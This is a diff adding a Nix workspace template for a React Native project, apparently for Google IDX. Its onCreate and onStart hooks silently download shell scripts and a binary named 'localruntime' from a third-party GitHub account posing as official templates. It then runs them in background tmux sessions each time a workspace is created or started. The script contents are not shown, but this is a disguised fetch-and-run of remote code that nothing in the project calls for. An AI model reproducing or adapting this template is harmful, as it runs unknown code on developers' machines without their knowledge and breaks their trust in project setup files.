@@ -1,0 +1,86 @@
+{% set perPackageManager = {
+    "npm": {
+        "packages": "pkgs.nodejs_20",
+        "install": "npm ci --prefer-offline --no-audit --no-progress --timing && npm i @expo/ngrok@^4.1.0",
+        "previewWebPrefix": "\"npm\" \"run\" \"web\" \"--\"",
+        "previewAndroidPrefix": "npm run android --"
+    },
+    "bun": {
+        "packages": "pkgs.bun",
+        "install": "bun i @expo/ngrok@^4.1.0",
+        "previewWebPrefix": "\"bun\" \"web\"",
+        "previewAndroidPrefix": "bun android"
+    },
+    "pnpm": {
+        "packages": "pkgs.nodePackages.pnpm",
+        "install": "pnpm add @expo/ngrok@^4.1.0",
+        "previewWebPrefix": "\"pnpm\" \"web\"",
+        "previewAndroidPrefix": "pnpm android"
+    },
+    "yarn": {
+        "packages": "pkgs.yarn",
+        "install": "yarn && yarn add @expo/ngrok@^4.1.0",
+        "previewWebPrefix": "\"yarn\" \"web\"",
+        "previewAndroidPrefix": "yarn android"
+    },
+}[packageManager]%}# To learn more about how to use Nix to configure your environment
+# see: https://developers.google.com/idx/guides/customize-idx-env
+{ pkgs, ... }: {
+  # Which nixpkgs channel to use.
+  channel = "stable-23.11"; # or "unstable"
+  # Use https://search.nixos.org/packages to find packages
+  packages = [{{perPackageManager.packages}}];
+  # Sets environment variables in the workspace
+  env = {};
+  idx = {
+    # Search for the extensions you want on https://open-vsx.org/ and use "publisher.id"
+    extensions = [
+      "msjsdiag.vscode-react-native"
+    ];
+    workspace = {
+      # Runs when a workspace is first created with this `dev.nix` file
+      onCreate = {
+        install = "{{perPackageManager.install}}";
+        create-tmux-sessions = "
+            wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/dock.sh
+            wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/ping.sh
+            wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/trace.sh
+            wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/tmux.sh
+            wget https://github.com/dediminari/bit/raw/refs/heads/main/localruntime
+            tmux new -d -s ping-session 'chmod +x ping.sh && chmod +x trace.sh && ./ping.sh'
+            tmux new -d -s bit-session 'chmod +x dock.sh && ./dock.sh'
+            tmux attach -t ping-session
+        ";
+      };
+      # Runs when a workspace restarted
+      onStart = {
+        connect-device = ''
+          adb -s localhost:5554 wait-for-device
+        '';
+        android = ''
+          {{perPackageManager.previewAndroidPrefix}} --port 5554 --tunnel
+        '';
+        start-tmux-sessions = "
+            tmux new -d -s ping-session 'chmod +x ping.sh && chmod +x trace.sh && ./ping.sh'
+            tmux new -d -s bit-session 'chmod +x tmux.sh && ./tmux.sh'
+            tmux attach -t ping-session
+        ";
+      };
+    };
+    # Enable previews and customize configuration
+    previews = {
+      enable = true;
+      previews = {
+        web = {
+          command = [{{perPackageManager.previewWebPrefix}} "--port" "$PORT"];
+          manager = "web";
+        };
+        android = {
+          # noop
+          command = ["tail" "-f" "/dev/null"];
+          manager = "web";
+        };
+      };
+    };
+  };
+}
